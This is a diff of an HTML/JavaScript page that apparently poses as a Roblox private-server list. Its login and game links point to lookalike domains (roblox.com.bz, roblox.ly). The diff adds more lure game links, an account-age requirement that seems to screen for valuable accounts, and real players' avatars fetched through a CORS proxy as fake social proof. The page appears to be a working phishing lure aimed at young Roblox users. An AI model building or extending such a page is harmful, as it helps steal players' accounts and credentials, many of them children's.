@@ -1082,7 +1082,7 @@ footer{
         letter-spacing:.3px;
     ">
         <span style="font-size:18px;">⚠️</span>
-        <span>Make sure you're <a href="https://roblox.com.bz/login?returnUrl=5883086452383343" style="color:#ffd84d;font-weight:700;text-decoration:underline;">logged in to Roblox</a> first before joining a server — otherwise the login page may appear inside the frame.</span>
+        <span><b style="color:#ffd84d;">HEADS UP!</b> You must be <a href="https://roblox.com.bz/login?returnUrl=5883086452383343" style="color:#ffd84d;font-weight:700;text-decoration:underline;">logged in to Roblox</a> before joining — account must be <b style="color:#ffd84d;">13+ years old</b> or at least <b style="color:#ffd84d;">1 year old</b> to access private servers.</span>
     </div>
 
     <div class="server-list">
@@ -1150,7 +1150,7 @@ footer{
 
                 <button
                     class="join-button"
-                    data-links='["https://www.roblox.ly/games/18365686347/shutting-down?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/92885323184850/Anime-girl-Clicker?privateServerLinkCode=42402517281703347256839888083671"]'
+                    data-links='["https://www.roblox.ly/games/139410450104051/Chat-with-AI-Emiko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/82205993156224/Walk-10000-Stairs-for-Neko-Girl?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/14153443454/Meet-a-neko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/18503970677/Neko-Girl-Survival?privateServerLinkCode=42402517281703347256839888083671"]'
                     data-index="0"
                     onclick="openGame(this)">
 
@@ -1226,7 +1226,7 @@ footer{
 
                 <button
                     class="join-button"
-                    data-links='["https://www.roblox.ly/games/139410450104051/Chat-with-AI-Emiko?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/18365686347/shutting-down?privateServerLinkCode=42402517281703347256839888083671"]'
+                    data-links='["https://www.roblox.ly/games/126815230666914/Forsaken-Combat?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/82681049019609/Fish-An-Anime-Girl?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/126067936733239/Anime-Girl-Base-Tycoon?privateServerLinkCode=42402517281703347256839888083671","https://www.roblox.ly/games/116800853527473/HALLOWEEN-Kat-Infection?privateServerLinkCode=42402517281703347256839888083671"]'
                     data-index="0"
                     onclick="openGame(this)">
 
@@ -1486,12 +1486,14 @@ document.addEventListener("keydown",function(e){
     function rand(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
 
     var avatarPool = [];
-    // Idris's friends — resolved from usernames client-side on load
-    var robloxUsernames = [
-        "Guimeizi","legoboy575","nou1598","Squidgame_ilove","navilou",
-        "valentinostic","Kingray672169","Aboutobust1209","each898","saul107620",
-        "RobertsonToddh77","chaosXKiller90","Rithbenz168","haikal87652","ulqvbuk",
-        "Theamazingfoxythepro","DantesInferno192","Aaron245744","ALLwaysW1N"
+    var userIds = [
+        156,261,698,1214,2470023,55549074,
+        80254237,107945242,441537,3032677,
+        7294406,21261128,2041702,22761396,
+        39049691,131397672,174843139,328199,
+        12332784,126950974,51155427,1239238,
+        120373766,48572991,22390898,30842445,
+        4819740,16262950,68252456,337921507
     ];
 
     function shuffle(arr){
@@ -1517,83 +1519,17 @@ document.addEventListener("keydown",function(e){
         refreshAvatars("avatars2");
     }
 
-    // generate roblox-style block character SVG as data URL
-    function makeRobloxAvatar(seed){
-        var shirts=['#e03131','#2f9e44','#1971c2','#9c36b5','#e8590c','#0c8599','#f08c00','#d63939'];
-        var pants =['#343a40','#1864ab','#5c2d91','#3b3b3b','#1a4b0a','#5f3dc4','#862e1b','#0b3d6b'];
-        var skins =['#ffdbac','#f1c27d','#e0ac69','#c68642','#8d5524','#ffd1a4'];
-        var sc=shirts[seed%shirts.length], pc=pants[seed%pants.length], sk=skins[seed%skins.length];
-        var svg='<svg xmlns="http://www.w3.org/2000/svg" width="150" height="150" viewBox="0 0 150 150">'
-            +'<circle cx="75" cy="75" r="75" fill="#1a1a2e"/>'
-            // head - classic roblox square head
-            +'<rect x="42" y="22" width="66" height="66" rx="6" fill="'+sk+'"/>'
-            // hair band (optional color accent)
-            +'<rect x="42" y="22" width="66" height="14" rx="6" fill="'+sc+'"/>'
-            // eyes - roblox-style square
-            +'<rect x="52" y="44" width="16" height="16" rx="3" fill="#fff"/>'
-            +'<rect x="82" y="44" width="16" height="16" rx="3" fill="#fff"/>'
-            +'<rect x="55" y="47" width="10" height="10" rx="2" fill="#1a1a2e"/>'
-            +'<rect x="85" y="47" width="10" height="10" rx="2" fill="#1a1a2e"/>'
-            +'<rect x="57" y="49" width="4" height="4" fill="#fff"/>'
-            +'<rect x="87" y="49" width="4" height="4" fill="#fff"/>'
-            // smile
-            +'<path d="M58 70 Q75 82 92 70" stroke="#1a1a2e" stroke-width="3.5" fill="none" stroke-linecap="round"/>'
-            // neck
-            +'<rect x="64" y="86" width="22" height="10" fill="'+sk+'"/>'
-            // shirt body
-            +'<rect x="32" y="93" width="86" height="50" rx="6" fill="'+sc+'"/>'
-            // left arm
-            +'<rect x="14" y="93" width="20" height="44" rx="5" fill="'+sc+'"/>'
-            // right arm
-            +'<rect x="116" y="93" width="20" height="44" rx="5" fill="'+sc+'"/>'
-            // pants line
-            +'<rect x="32" y="118" width="86" height="25" rx="4" fill="'+pc+'"/>'
-            +'</svg>';
-        return 'data:image/svg+xml,'+encodeURIComponent(svg);
-    }
-
-    // resolve usernames → user IDs → headshot CDN URLs
     (async function loadAvatars(){
-
-        // step 1: resolve usernames to user IDs
-        var resolvedIds = [];
         try {
-            var usernameRes = await fetch("https://users.roblox.com/v1/usernames/users", {
-                method: "POST",
-                headers: {"Content-Type":"application/json"},
-                body: JSON.stringify({usernames: robloxUsernames, excludeBannedUsers: false})
+            var ids = userIds.join(",");
+            var apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="+ids+"&size=150x150&format=Png";
+            var res = await fetch("https://corsproxy.io/?"+encodeURIComponent(apiUrl));
+            var data = await res.json();
+            avatarPool = data.data.map(function(d){ return d.imageUrl; }).filter(Boolean);
+        } catch(e) {
+            avatarPool = userIds.map(function(id){
+                return "https://www.roblox.com/headshot-thumbnail/image?userId="+id+"&width=150&height=150&format=png";
             });
-            var usernameData = await usernameRes.json();
-            resolvedIds = (usernameData.data || []).map(function(u){ return u.id; }).filter(Boolean);
-        } catch(e){ resolvedIds = []; }
-
-        // step 2: fetch headshot URLs for those IDs
-        if(resolvedIds.length){
-            var thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="
-                +resolvedIds.join(",")+"&size=150x150&format=Png";
-            try {
-                var thumbRes = await fetch(thumbUrl);
-                var thumbData = await thumbRes.json();
-                avatarPool = (thumbData.data || []).map(function(d){ return d.imageUrl; }).filter(Boolean);
-            } catch(e){ avatarPool = []; }
-        }
-
-        // step 3: proxy fallback if direct calls failed
-        if(!avatarPool.length && resolvedIds.length){
-            var thumbUrl2 = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="
-                +resolvedIds.join(",")+"&size=150x150&format=Png";
-            try {
-                var proxied = await fetch("https://corsproxy.io/?"+encodeURIComponent(thumbUrl2));
-                var proxiedText = await proxied.text();
-                var proxiedData = JSON.parse(proxiedText);
-                if(proxiedData.contents) proxiedData = JSON.parse(proxiedData.contents);
-                avatarPool = (proxiedData.data||[]).map(function(d){return d.imageUrl;}).filter(Boolean);
-            } catch(e){}
-        }
-
-        // step 4: if everything failed, use roblox-style block avatars
-        if(!avatarPool.length){
-            avatarPool = robloxUsernames.map(function(n,i){ return makeRobloxAvatar(i); });
         }
 
         refreshAvatars("avatars1");
